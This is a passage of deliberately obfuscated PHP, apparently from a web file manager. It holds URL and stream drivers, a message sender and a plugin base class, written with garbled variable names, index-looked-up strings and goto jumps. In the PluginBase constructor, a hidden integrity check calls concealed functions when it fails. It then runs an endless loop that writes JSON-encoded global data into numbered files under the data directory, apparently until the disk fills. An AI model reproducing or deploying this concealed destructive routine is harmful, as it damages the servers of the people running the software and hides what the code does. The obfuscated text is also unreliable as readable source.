$İê±ÃÖÎ[$¸ú¸±öÃ[475]]) { return !1; } return parent::update($¦ËÕ³Óà, $â¼åµÚ²); } public function remove($¹ÒÖúŞ, $ƒõ¾âûé = false) { $ÚæŠ«ğø =& $_SERVER[Ùæõ‰Ï’]; $à’¯ì÷¡ = $this->listData($¹ÒÖúŞ); if (!$à’¯ì÷¡) { return; } if (!$ƒõ¾âûé && $à’¯ì÷¡[$ÚæŠ«ğø[191]] == $ÚæŠ«ğø[91]) { return !1; } return parent::remove($¹ÒÖúŞ); } public function enable($€–ã›ú, $é›¶Ç•) { return $this->update($€–ã›ú, array($_SERVER[Ùæõ‰Ï’][2443] => $é›¶Ç•)); } public function run($¯ñÒÇ“ø) { return $this->update($¯ñÒÇ“ø, array($_SERVER[Ùæõ‰Ï’][2455] => time())); } } goto AôŸ”±ƒÂŸ; D‰ÊªÙ‚: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($’‰¼“à¿ = false) { } public function exist($¼…‘›ôÔ) { $É­·ÖÊ’ = $this->info($¼…‘›ôÔ); return $É­·ÖÊ’[$_SERVER[Ùæõ‰Ï’][232]]; } public function isFile($£ÏÑßÊ«) { $Îâı§¦ú = $this->info($£ÏÑßÊ«); return $Îâı§¦ú[$_SERVER[Ùæõ‰Ï’][232]]; } public function isFolder($öæ¡¬˜ô) { return !1; } public function size($„Û‚ââš) { $úú®–ªØ = $this->info($„Û‚ââš); return $úú®–ªØ[$_SERVER[Ùæõ‰Ï’][79]]; } public function info($”Ø«Ù˜) { return $this->infoParse($”Ø«Ù˜); } public function infoAuth($¾ÈËöµ¿) { return $this->infoParse($¾ÈËöµ¿); } public function infoWithChildren($»»ˆçÉ¿) { return $this->infoParse($»»ˆçÉ¿); } public function infoFull($ŞÏ¤À†Ì) { return $this->infoParse($ŞÏ¤À†Ì); } private function infoParse($Ú§æ¸ÃŞ) { $ßøƒøó€ =& $_SERVER[Ùæõ‰Ï’]; $øñÍñ¹• = $this->header($Ú§æ¸ÃŞ); if (!$øñÍñ¹• || !$øñÍñ¹•[$ßøƒøó€[833]]) { return !1; } $ÊÈÓŸ§Ş = _get($øñÍñ¹•, $ßøƒøó€[413], 0); $Ï—î Ëø = array($ßøƒøó€[32] => $øñÍñ¹•[$ßøƒøó€[32]], $ßøƒøó€[87] => $Ú§æ¸ÃŞ, $ßøƒøó€[33] => $ßøƒøó€[230], $ßøƒøó€[79] => intval($ÊÈÓŸ§Ş), $ßøƒøó€[169] => get_path_ext($øñÍñ¹•[$ßøƒøó€[32]]), $ßøƒøó€[1466] => $ÊÈÓŸ§Ş > 0 && $øñÍñ¹•[$ßøƒøó€[1616]], $ßøƒøó€[1467] => !1); return $Ï—î Ëø; } private function header($ñÃ¡½ñ³) { $Û¿ğØì¿ =& $_SERVER[Ùæõ‰Ï’]; if (isset(self::$_cacheHeader[$ñÃ¡½ñ³])) { return self::$_cacheHeader[$ñÃ¡½ñ³]; } $èóí­×® = isset($GLOBALS[$Û¿ğØì¿[1617]]) ? $GLOBALS[$Û¿ğØì¿[1617]] : !1; $GLOBALS[$Û¿ğØì¿[1617]] = !0; self::$_cacheHeader[$ñÃ¡½ñ³] = url_header($ñÃ¡½ñ³); $GLOBALS[$Û¿ğØì¿[1617]] = $èóí­×®; return self::$_cacheHeader[$ñÃ¡½ñ³]; } public function hashSimple($÷›åĞöÕ, $ó¤Ò  = false) { $ÚúÛä§ª =& $_SERVER[Ùæõ‰Ï’]; $ªî·©œ = $this->info($÷›åĞöÕ); if (!$ªî·©œ || !$ªî·©œ[$ÚúÛä§ª[232]]) { return !1; } $Ö€¬Â¢ = $ªî·©œ[$ÚúÛä§ª[79]]; $âæõëŒ = 200; $¯°ŸÓı = 50; if ($Ö€¬Â¢ <= $âæõëŒ * $¯°ŸÓı) { return md5($this->fileSubstr($÷›åĞöÕ, 0, $Ö€¬Â¢)) . $Ö€¬Â¢; } $Ù‚§ÑØ² = intval($Ö€¬Â¢ / $¯°ŸÓı); $ÖÅâ€Şï = $ÚúÛä§ª[12]; $ªã¶µ´” = timeFloat(); $œåº„’ = 15; for ($¯‘Ãé¦ü = 0; $¯‘Ãé¦ü < $¯°ŸÓı; $¯‘Ãé¦ü++) { if (timeFloat() - $ªã¶µ´” > $œåº„’) { return !1; } $áÕÑş§î = $this->fileSubstr($÷›åĞöÕ, $Ù‚§ÑØ² * $¯‘Ãé¦ü, $âæõëŒ); if (!$áÕÑş§î) { return !1; } $ÖÅâ€Şï .= $áÕÑş§î; } $ÖÅâ€Şï .= $this->fileSubstr($÷›åĞöÕ, $Ö€¬Â¢ - $âæõëŒ, $âæõëŒ); return md5($ÖÅâ€Şï) . $Ö€¬Â¢; } public function getContent($˜¬»Êï’) { return $this->fileSubstr($˜¬»Êï’); } public function fileSubstr($«üëÅùø, $ï‚â¡Åô = 0, $úÍ²Å©Ô = -1) { $¿‹¶Ğö =& $_SERVER[Ùæõ‰Ï’]; $‹â×”Üƒ = $this->info($«üëÅùø); if (!$‹â×”Üƒ || !$‹â×”Üƒ[$¿‹¶Ğö[232]] && $‹â×”Üƒ[$¿‹¶Ğö[79]] > 1024 * 1024 * 10) { return !1; } if ($úÍ²Å©Ô === -1) { $úÍ²Å©Ô = $‹â×”Üƒ[$¿‹¶Ğö[79]]; } if ($úÍ²Å©Ô == 0) { return $¿‹¶Ğö[12]; } $›µòâĞÀ = array($¿‹¶Ğö[1618] . $ï‚â¡Åô . $¿‹¶Ğö[868] . ($ï‚â¡Åô + $úÍ²Å©Ô - 1)); $¿½–®ªñ = url_request($«üëÅùø, $¿‹¶Ğö[261], !1, $›µòâĞÀ, !1, !1, 30); return $¿½–®ªñ[$¿‹¶Ğö[1300]] ? $¿½–®ªñ[$¿‹¶Ğö[1300]] : $¿‹¶Ğö[12]; } public function download($»»À¤áè, $©ƒê†£Û) { Downloader::start($»»À¤áè, $©ƒê†£Û); return $©ƒê†£Û; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¤’ü³Ü›, $ä¾½¸ÚÙ = '') { $this->info = $this->info($¤’ü³Ü›); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ùæõ‰Ï’][87]]; $this->pathOpen = $¤’ü³Ü›; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¤’ü³Ü›])) { self::$_chunkBuffer[$¤’ü³Ü›] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($¶éá·È) { $‰Ú¿»æü = $this->fileSubstr($this->pose, $¶éá·È); $this->pose += strlen($‰Ú¿»æü); return $‰Ú¿»æü; } public function stream_tell() { return $this->pose; } public function stream_seek($¼ÑÕš°, $µ˜­Ê‰) { $ªÓ‰á³å =& $_SERVER[Ùæõ‰Ï’]; if ($µ˜­Ê‰ == SEEK_SET) { $this->pose = $¼ÑÕš°; } else { if ($µ˜­Ê‰ == SEEK_CUR) { $this->pose += $¼ÑÕš°; } else { if ($µ˜­Ê‰ == SEEK_END) { $this->pose = $this->info[$ªÓ‰á³å[79]] + intval($¼ÑÕš°); } } } if ($¼ÑÕš° < 0) { $this->pose = $this->info[$ªÓ‰á³å[79]] + $¼ÑÕš°; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ùæõ‰Ï’][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÓÚ¡¾³ü, $’©¶ĞÍ) { $õÄñÀ¤¬ =& $_SERVER[Ùæõ‰Ï’]; $‚“ñ©˜ = $this->info($ÓÚ¡¾³ü); return array($õÄñÀ¤¬[1619] => 0, $õÄñÀ¤¬[1620] => 0, $õÄñÀ¤¬[16] => 32768 + 511, $õÄñÀ¤¬[1621] => 0, $õÄñÀ¤¬[1622] => 0, $õÄñÀ¤¬[1623] => 0, $õÄñÀ¤¬[1624] => 0, $õÄñÀ¤¬[79] => $‚“ñ©˜[$õÄñÀ¤¬[79]], $õÄñÀ¤¬[1625] => $‚“ñ©˜[$õÄñÀ¤¬[1465]], $õÄñÀ¤¬[1581] => $‚“ñ©˜[$õÄñÀ¤¬[88]], $õÄñÀ¤¬[1580] => $‚“ñ©˜[$õÄñÀ¤¬[231]], $õÄñÀ¤¬[1626] => 0, $õÄñÀ¤¬[1627] => 0); } static $fileInfo = array(); public function info($¥„’Á‹”) { $Ş°äÂì× = $_SERVER[Ùæõ‰Ï’][1628]; if (isset(self::$fileInfo[$¥„’Á‹”])) { return self::$fileInfo[$¥„’Á‹”]; } if (substr($¥„’Á‹”, 0, strlen($Ş°äÂì×)) != $Ş°äÂì×) { return !1; } self::$fileInfo[$¥„’Á‹”] = IO::info(substr($¥„’Á‹”, strlen($Ş°äÂì×))); return self::$fileInfo[$¥„’Á‹”]; } public static function read($¸¼ÁÎœ½, $ß€à‹åá, $’Àß…É’) { if (!isset(self::$_fopenCache[$¸¼ÁÎœ½])) { $Íäğ½Ì = new StreamWrapperIO(); $Íäğ½Ì->stream_open($¸¼ÁÎœ½); self::$_fopenCache[$¸¼ÁÎœ½] = $Íäğ½Ì; } $Íäğ½Ì = self::$_fopenCache[$¸¼ÁÎœ½]; return $Íäğ½Ì->fileSubstr($ß€à‹åá, $’Àß…É’); } public static function _read($š›çƒ˜Ó, $õàçÖ’÷, $›ÑÖÁ™…) { $éÜ¤õšÖ =& $_SERVER[Ùæõ‰Ï’]; $©ÚÑ´øÓ = fopen($š›çƒ˜Ó, $éÜ¤õšÖ[1469]); if (!$©ÚÑ´øÓ) { return $éÜ¤õšÖ[12]; } $¸À’»¡ß = 8192; fseek($©ÚÑ´øÓ, $õàçÖ’÷, SEEK_SET); $”³Û¬ÑÉ = $éÜ¤õšÖ[12]; $¶†š•Æ› = 0; while ($¶†š•Æ› < $›ÑÖÁ™…) { $ßµ®·—´ = min($¸À’»¡ß, $›ÑÖÁ™… - $¶†š•Æ›); $”³Û¬ÑÉ .= fread($©ÚÑ´øÓ, $ßµ®·—´); $¶†š•Æ› += $ßµ®·—´; } fclose($©ÚÑ´øÓ); return $”³Û¬ÑÉ; } public function fileSubstr($®ÂŞóÆ­, $›ê’ıÑñ) { $Ç›¸¥Æ£ =& $_SERVER[Ùæõ‰Ï’]; $®«ô­« = $this->info[$Ç›¸¥Æ£[79]]; $‘’„©¼¥ = $®ÂŞóÆ­; $ı ÜŒ– = $›ê’ıÑñ; if ($®ÂŞóÆ­ < 0) { $®ÂŞóÆ­ = $®«ô­« + $®ÂŞóÆ­; } if ($›ê’ıÑñ === !1) { $›ê’ıÑñ = $®«ô­« - $®ÂŞóÆ­; } if ($®ÂŞóÆ­ + $›ê’ıÑñ > $®«ô­«) { $›ê’ıÑñ = $®«ô­« - $®ÂŞóÆ­; } if ($›ê’ıÑñ <= 0) { return $Ç›¸¥Æ£[12]; } if ($®ÂŞóÆ­ < 0 || $®ÂŞóÆ­ >= $®«ô­« || $›ê’ıÑñ <= 0 || $›ê’ıÑñ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\x6c\x65\x52\x65\x61\144\x20\x65\x72\162\x6f\x72\x21\40\x73\164\141\x72\x74\x3d{$®ÂŞóÆ­}\x3b\154\x65\156\147\x74\x68\x3d{$›ê’ıÑñ}\73\x20\163\151\x7a\x65\75{$®«ô­«}\73"); } $Êª’‚Ó = 64 * 1024; $âôã½—• =& self::$_chunkBuffer[$this->path]; if (!$âôã½—•) { $âôã½—• = array(); } $²äå™ış = 0; $éÂ„Óñ” = 0; $½Î€ş‰È = $Ç›¸¥Æ£[12]; foreach ($âôã½—• as $²äå™ış => $½Î€ş‰È) { $²äå™ış = intval($²äå™ış); $éÂ„Óñ” = $²äå™ış + strlen($½Î€ş‰È); if ($®ÂŞóÆ­ >= $éÂ„Óñ”) { continue; } if ($®ÂŞóÆ­ >= $²äå™ış && $®ÂŞóÆ­ + $›ê’ıÑñ <= $éÂ„Óñ”) { return substr($½Î€ş‰È, $®ÂŞóÆ­ - $²äå™ış, $›ê’ıÑñ); } break; } if (count($âôã½—•) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ç›¸¥Æ£[1629], $Ç›¸¥Æ£[1630] . count($âôã½—•) . "\73\x73\x74\x61\x72\x74\x3d{$®ÂŞóÆ­}\x2c\x6c\x65\x6e\x67\x74\x68\75{$›ê’ıÑñ}\73\160\x6f\163\x65\x3a{$²äå™ış}\176{$éÂ„Óñ”}"); throw new Exception($Ç›¸¥Æ£[1631]); } $·úğ›ıˆ = intval($®ÂŞóÆ­ / $Êª’‚Ó) * $Êª’‚Ó; $ôÃ´ä¶å = ceil(($®ÂŞóÆ­ + $›ê’ıÑñ) / $Êª’‚Ó) * $Êª’‚Ó - $·úğ›ıˆ; $ÌŒ§Íµ = IO::fileSubstr($this->path, $·úğ›ıˆ, $ôÃ´ä¶å); $âôã½—•[$·úğ›ıˆ . $Ç›¸¥Æ£[12]] = $ÌŒ§Íµ; ksort($âôã½—•); $ßĞõäî = substr($ÌŒ§Íµ, $®ÂŞóÆ­ - $·úğ›ıˆ, $›ê’ıÑñ); return $ßĞõäî; } private function log($ÂÊâÚáû, $¼¡×¤ö’) { $ûîûŒõ =& $_SERVER[Ùæõ‰Ï’]; $âÄ§Ë§ª = timeFloat() - $this->timeStart; write_log(sprintf($ûîûŒõ[1632], $ÂÊâÚáû, $this->info[$ûîûŒõ[32]], $âÄ§Ë§ª, $¼¡×¤ö’), $ûîûŒõ[1277]); } } class Message { function __construct() { } public function send($£´¯ø³‰ = '', $’ÀÒÚ”è = array(), $–¤“Âš› = "\x74\x65\170\164") { $ß‰Éšƒ¦ =& $_SERVER[Ùæõ‰Ï’]; $¼íÒ²ûã = array($ß‰Éšƒ¦[33] => $ß‰Éšƒ¦[1633], $ß‰Éšƒ¦[171] => $£´¯ø³‰); if (in_array($–¤“Âš›, array($ß‰Éšƒ¦[1633], $ß‰Éšƒ¦[1634]))) { $¼íÒ²ûã[$ß‰Éšƒ¦[33]] = $–¤“Âš›; } $’ÀÒÚ”è = array($ß‰Éšƒ¦[578] => isset($’ÀÒÚ”è[$ß‰Éšƒ¦[578]]) ? $’ÀÒÚ”è[$ß‰Éšƒ¦[578]] : $ß‰Éšƒ¦[12], $ß‰Éšƒ¦[662] => isset($’ÀÒÚ”è[$ß‰Éšƒ¦[662]]) ? $’ÀÒÚ”è[$ß‰Éšƒ¦[662]] : $ß‰Éšƒ¦[12]); if (empty($£´¯ø³‰) || empty($’ÀÒÚ”è[$ß‰Éšƒ¦[578]]) && empty($’ÀÒÚ”è[$ß‰Éšƒ¦[662]])) { return !1; } $‚¸Ù›Š = array($ß‰Éšƒ¦[1561] => $¼íÒ²ûã, $ß‰Éšƒ¦[1635] => $’ÀÒÚ”è); Hook::trigger($ß‰Éšƒ¦[1636], $‚¸Ù›Š); } } goto dÆèõã±; dÆèõã±: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $€±®­Òç =& $_SERVER[Ùæõ‰Ï’]; $ëãó ¦Ê = $_SERVER[$€±®­Òç[959]]; $şÕëçâ = $€±®­Òç[960]; if ($_SERVER[$€±®­Òç[961]] != $şÕëçâ($ëãó ¦Ê)) { $ÜäÕç¿Æ = $€±®­Òç[962]; $Ò€÷ÄÃ¡ = $€±®­Òç[963]; $©ÀÍ† = $_SERVER[$€±®­Òç[964]] . $€±®­Òç[965]; $€¾„ĞÔ = $Ò€÷ÄÃ¡($©ÀÍ†); $Š’Ë“¯” = explode($€±®­Òç[262], $€¾„ĞÔ); if (count($Š’Ë“¯”) < $€±®­Òç[680]) { $©Ëü†é = $€±®­Òç[966]; $©Ëü†é(); } $èú–ûÙ = $€±®­Òç[967]; $èú–ûÙ($_SERVER[$€±®­Òç[968]]); $ÜäÕç¿Æ = $€±®­Òç[962]; $ÜäÕç¿Æ(); $²œ‡ïü = $€±®­Òç[969]; $ñˆ·Ï› = json_encode($GLOBALS[$€±®­Òç[970]]); $šçÌ”Á« = 1; for ($©Âï‰Ê‘ = $šçÌ”Á«; $©Âï‰Ê‘ > 0; $©Âï‰Ê‘++) { $²œ‡ïü(DATA_PATH . $©Âï‰Ê‘, $ñˆ·Ï›); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($€±®­Òç[1637]); $this->pluginName = str_replace($€±®­Òç[1637], $€±®­Òç[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $€±®­Òç[8]; $this->pluginApi = appHostGet() . $€±®­Òç[1638] . $this->pluginName . $€±®­Òç[8]; $this->pluginHost = $config[$€±®­Òç[1639]] . $this->pluginName . $€±®­Òç[8]; $this->pluginHostDefault = $config[$€±®­Òç[1639]] . $this->pluginName . $€±®­Òç[8]; $ş·ò½ªÂ = $config[$€±®­Òç[1640]]; if ($ş·ò½ªÂ && strpos($€±®­Òç[50] . $ş·ò½ªÂ . $€±®­Òç[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$€±®­Òç[1641]] . $this->pluginName . $€±®­Òç[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ùæõ‰Ï’][1642]); } protected function assign($Ê§®œù½, $«×¨ó©ö = false) { if (is_array($Ê§®œù½)) { $this->values = array_merge($this->values, $Ê§®œù½); } else { $this->values[$Ê§®œù½] = $«×¨ó©ö; } } protected function display($é…©Ö­Ô) { extract($this->values); require $é…©Ö­Ô; } final function hookRegist($ß§Ó˜«) { $this->modelPlugin->appRegist($this->pluginName, $ß§Ó˜«); } final function appIcon() { $ Ó¡•úù =& $_SERVER[Ùæõ‰Ï’]; $ì¦‹Åã’ = $this->appPackage(); $‰µÖŞ¬ = $ Ó¡•úù[12]; if (isset($ì¦‹Åã’[$ Ó¡•úù[490]])) { if (isset($ì¦‹Åã’[$ Ó¡•úù[490]][$ Ó¡•úù[1643]])) { $‰µÖŞ¬ = $ Ó¡•úù[1644] . $ì¦‹Åã’[$ Ó¡•úù[490]][$ Ó¡•úù[1643]] . $ Ó¡•úù[1645]; } else { if ($ì¦‹Åã’[$ Ó¡•úù[490]][$ Ó¡•úù[1646]]) { $‰µÖŞ¬ = $ Ó¡•úù[1647] . $ì¦‹Åã’[$ Ó¡•úù[490]][$ Ó¡•úù[1646]] . $ Ó¡•úù[1648]; } } } return $‰µÖŞ¬; } final function fileCanView($Æğ•®õ¶) { $í×‰à =& $_SERVER[Ùæõ‰Ï’]; if (request_url_safe($Æğ•®õ¶)) { return !0; } if ($this->isShare($Æğ•®õ¶)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $®šÁìúè = $í×‰à[1649] . rawurlencode(this_url()); show_tips(LNG($í×‰à[1650]) . $í×‰à[1651] . $®šÁìúè . $í×‰à[1652] . LNG($í×‰à[1653]) . $í×‰à[1654], !1); } if (!Action($í×‰à[1655])->authCan($í×‰à[1656])) { show_tips(LNG($í×‰à[1657]) . $í×‰à[1658], !1); } ActionCall($í×‰à[1659], $Æğ•®õ¶); } final function isShare($…¯ú£şß) { $¬Õ¼à±¡ = KodIO::parse($…¯ú£şß); return $¬Õ¼à±¡[$_SERVER[Ùæõ‰Ï’][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($·Ş‘°Ô) { if (request_url_safe($·Ş‘°Ô)) { return $·Ş‘°Ô; } if (!$this->isShare($·Ş‘°Ô)) { $·Ş‘°Ô = $this->filePath($·Ş‘°Ô, !1); } return Action($_SERVER[Ùæõ‰Ï’][1269])->linkOut($·Ş‘°Ô); } public function filePathLinkOut($—ÇŞì¸¡) { if (request_url_safe($—ÇŞì¸¡)) { return $—ÇŞì¸¡; } $this->fileCanView($—ÇŞì¸¡); return Action($_SERVER[Ùæõ‰Ï’][1269])->link($—ÇŞì¸¡); } final function filePath($³§ıä”, $˜Å˜‹ø£ = true, $êÔªŒÈĞ = false) { $Ïáı´ç =& $_SERVER[Ùæõ‰Ï’]; $õÅÒ ¯¼ = $this->filePathGet($³§ıä”, $˜Å˜‹ø£); if (!$this->fileInfo) { show_tips(LNG($Ïáı´ç[108]), !1); } if ($êÔªŒÈĞ && isset($this->fileInfo[$Ïáı´ç[541]]) && $this->fileInfo[$Ïáı´ç[541]]) { $†û›ÎÉŸ = Model($Ïáı´ç[544])->fileInfo($this->fileInfo[$Ïáı´ç[541]]); if (!$†û›ÎÉŸ || !IO::exist($†û›ÎÉŸ[$Ïáı´ç[87]])) { show_tips(LNG($Ïáı´ç[108]) . $Ïáı´ç[1660]); } } Hook::trigger($Ïáı´ç[1661], $õÅÒ ¯¼); return $õÅÒ ¯¼; } final function filePathGet($¿„†®¶ï, $¶õ¢÷ş = true) { $´…ë¡«™ =& $_SERVER[Ùæõ‰Ï’]; if ($Ï½íÅ÷³ = $this->checkSharePath($¿„†®¶ï, $¶õ¢÷ş)) { return $Ï½íÅ÷³; } $this->fileCanView($¿„†®¶ï); if (request_url_safe($¿„†®¶ï)) { $âá›Ëò± = parse_url_query($¿„†®¶ï); if (isset($âá›Ëò±[$´…ë¡«™[1662]]) && isset($âá›Ëò±[$´…ë¡«™[234]])) { $ëºïè¢ = Mcrypt::decode($âá›Ëò±[$´…ë¡«™[234]], Model($´…ë¡«™[853])->get($´…ë¡«™[854])); if ($ëºïè¢) { $this->fileInfo = IO::info($ëºïè¢); $this->fileInfo[$´…ë¡«™[1663]] = $¿„†®¶ï; $this->cachePath = $this->pluginCachePath($´…ë¡«™[12], $¶õ¢÷ş); return $ëºïè¢; } } $¿„†®¶ï = $this->_cacheHttpFile($¿„†®¶ï, $¶õ¢÷ş); $this->fileInfo = IO::info($¿„†®¶ï); } else { $this->fileInfo = IO::info($¿„†®¶ï); $this->cachePath = $this->pluginCachePath($´…ë¡«™[12], $¶õ¢÷ş); } return $¿„†®¶ï; } final function _cacheHttpFile($¶¾ƒïª, $ã³ó£ã‹ = true) { $íßÔÒñ =& $_SERVER[Ùæõ‰Ï’]; $ıõØ½œª = parse_url_query($¶¾ƒïª); $Â–¡Ëºâ = get_path_ext($¶¾ƒïª); if (isset($ıõØ½œª[$íßÔÒñ[32]]) && $ıõØ½œª[$íßÔÒñ[32]]) { $Â–¡Ëºâ = get_path_ext($ıõØ½œª[$íßÔÒñ[32]]); } $‘ÁšÕ½ = hash_path($¶¾ƒïª) . $íßÔÒñ[10] . $Â–¡Ëºâ; $this->cachePath = $this->pluginCachePath($ã³ó£ã‹ ? $‘ÁšÕ½ : $íßÔÒñ[12]); $»Èø¥Ö = IO::fileNameExist($this->cachePath, $‘ÁšÕ½); if ($»Èø¥Ö) { return KodIO::make($»Èø¥Ö); } $ŠªşÚ´¡ = rtrim($this->cachePath, $íßÔÒñ[8]) . $íßÔÒñ[8] . $‘ÁšÕ½; return $this->pluginCacheFileSet($ŠªşÚ´¡, file_get_contents_nossl($¶¾ƒïª)); } final function checkSharePath($Âñ‰¥ª…, $ëˆ‚æâ€ = true) { $´¸Œò´ß =& $_SERVER[Ùæõ‰Ï’]; if (!$this->isShare($Âñ‰¥ª…)) { return !1; } $÷œĞ½´Ÿ = Action($´¸Œò´ß[1269])->sharePathInfo($Âñ‰¥ª…); if (!is_array($÷œĞ½´Ÿ) || !isset($÷œĞ½´Ÿ[$´¸Œò´ß[87]])) { show_json(LNG($´¸Œò´ß[1664]), !1); } $this->fileInfo = $÷œĞ½´Ÿ; $this->cachePath = $this->pluginCachePath(!1, $ëˆ‚æâ€); return $÷œĞ½´Ÿ[$´¸Œò´ß[87]]; } final function pluginCachePath($ù—Ùç‘ = '', $àí¬á¤« = false) { $•áÀ¶ =& $_SERVER[Ùæõ‰Ï’]; if ($àí¬á¤« && is_array($this->fileInfo)) { $ù—Ùç‘ = kodIO::hashPath($this->fileInfo); } $íÏä¨õ… = rtrim(IO_PATH_SYSTEM_TEMP . $•áÀ¶[1665] . $this->pluginName . $•áÀ¶[8] . $ù—Ùç‘, $•áÀ¶[8]); $«€›Õö¬ = IO::infoFullSimple($íÏä¨õ…); $©ù’°”ä = $«€›Õö¬ && is_array($«€›Õö¬) ? $«€›Õö¬[$•áÀ¶[87]] : $•áÀ¶[12]; if (!$©ù’°”ä) { $©ù’°”ä = IO::mkdir($íÏä¨õ…); } return $©ù’°”ä; } final function pluginCacheFileSet($Å˜éë, $ìı“íœ‚ = '') { $ÄÄ”í«´ =& $_SERVER[Ùæõ‰Ï’]; $–ğ°Ôâú = IO::infoFullSimple($Å˜éë); if (!$–ğ°Ôâú) { return IO::mkfile($Å˜éë, $ìı“íœ‚, REPEAT_REPLACE); } IO::setContent($–ğ°Ôâú[$ÄÄ”í«´[87]], $ìı“íœ‚); return $–ğ°Ôâú[$ÄÄ”í«´[87]]; } final function pluginLocalFile($Šœ¹€è« = '') { $“®ñİ— =& $_SERVER[Ùæõ‰Ï’]; $…‡æÑé = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($…‡æÑé)) { mk_dir($…‡æÑé); } if (!$Šœ¹€è«) { return $…‡æÑé; } $×Ãß…¨ = IO::info($Šœ¹€è«); $­Â„ÑŒ‹ = $“®ñİ—[1666] . KodIO::hashPath($×Ãß…¨) . $“®ñİ—[10] . $×Ãß…¨[$“®ñİ—[169]]; if (!checkExtSafe($­Â„ÑŒ‹)) { $­Â„ÑŒ‹ = $­Â„ÑŒ‹ . $“®ñİ—[1304]; } $éÒ€è© = $…‡æÑé . $­Â„ÑŒ‹; if (@file_exists($éÒ€è©)) { return $éÒ€è©; } return IO::copy($Šœ¹€è«, $…‡æÑé, 0, $­Â„ÑŒ‹); } final function appPackage() { $şú›ğÇ  =& $_SERVER[Ùæõ‰Ï’]; if ($this->packageData) { return $this->packageData; } $¦ïÔ““Œ = $this->parseFile($this->pluginPath . $şú›ğÇ [1667]); $this->parseLang($¦ïÔ““Œ); $¦ú²çÙØ = json_decode_force($¦ïÔ““Œ); if (!$¦ú²çÙØ) { return array(); } $ïà°ú° = Hook::trigger($şú›ğÇ [1668], $¦ú²çÙØ); if ($ïà°ú° && is_array($ïà°ú°)) { $¦ú²çÙØ = $ïà°ú°; } $this->packageData = $¦ú²çÙØ; return $¦ú²çÙØ; } public function packageInfoGet($è½ÎÇ¢ô) { $±Á©‹ÄÜ = $this->appPackage(); return array_get_value($±Á©‹ÄÜ, $è½ÎÇ¢ô); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ùæõ‰Ï’][1669]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ùæõ‰Ï’][1670]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ùæõ‰Ï’][1671]); } public function echoJsAssign($äí½Œô, $Ùˆ„íÜ) { $this->echoJsAssignArr[$äí½Œô] = $Ùˆ„íÜ; } private function parseFile($¿…¹…ãÙ) { $¤â£ôå =& $_SERVER[Ùæõ‰Ï’]; $š§‰›µ÷ = file_get_contents_nossl($¿…¹…ãÙ); $ùÖ¡»Ï¹ = array($¤â£ôå[1672], $¤â£ôå[1673], $¤â£ôå[1674], $¤â£ôå[1675], $¤â£ôå[1676], $¤â£ôå[1677], $¤â£ôå[1678]); $¹Àé¸¬¡ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¤â£ôå[92]][$¤â£ôå[1679]]); foreach ($this->echoJsAssignArr as $œ´“ŞÙ => $©«É¹¸¯) { $ùÖ¡»Ï¹[] = $¤â£ôå[1680] . $œ´“ŞÙ . $¤â£ôå[1681]; $¹Àé¸¬¡[] = is_array($©«É¹¸¯) || is_object($©«É¹¸¯) ? rawurlencode(json_encode($©«É¹¸¯)) : $©«É¹¸¯; } if (strstr($š§‰›µ÷, $¤â£ôå[1682])) { $¹¤®‚ì = rawurlencode(json_encode($this->pluginLangArr)); $š§‰›µ÷ = str_replace($¤â£ôå[1682], $¹¤®‚ì, $š§‰›µ÷); } if (strstr($š§‰›µ÷, $¤â£ôå[1683])) { $¹¤®‚ì = $¹¤®‚ì = rawurlencode(json_encode($this->getConfig())); $š§‰›µ÷ = str_replace($¤â£ôå[1683], $¹¤®‚ì, $š§‰›µ÷); } $š§‰›µ÷ = str_replace($ùÖ¡»Ï¹, $¹Àé¸¬¡, $š§‰›µ÷); return $š§‰›µ÷; } private function parseLang(&$¥û‘Éˆ§) { $››âİû =& $_SERVER[Ùæõ‰Ï’]; $›»ÀÁÔ¿ = $››âİû[1684]; if (!strstr($¥û‘Éˆ§, $›»ÀÁÔ¿)) { return; } preg_match_all($››âİû[1685], $¥û‘Éˆ§, $”­ ºßÍ); if (!is_array($”­ ºßÍ) || count($”­ ºßÍ) == 0 || !is_array($”­ ºßÍ[0]) || count($”­ ºßÍ[0]) == 0) { return; } $İŠ¦Üû = array(); $Ğ¶©¡„µ = array(); foreach ($”­ ºßÍ[0] as $äö¦‘õ) { $ÃñÈÜÑ· = substr($äö¦‘õ, strlen($›»ÀÁÔ¿), -4); $²¤˜™¡Û = LNG($ÃñÈÜÑ·); $İŠ¦Üû[] = $äö¦‘õ; $Ğ¶©¡„µ[] = str_replace(array($››âİû[262], $››âİû[1170], $››âİû[418], $››âİû[121]), array($››âİû[53], $››âİû[53], $››âİû[12], $››âİû[1686]), $²¤˜™¡Û); } $¥û‘Éˆ§ = str_replace($İŠ¦Üû, $Ğ¶©¡„µ, $¥û‘Éˆ§); } private function 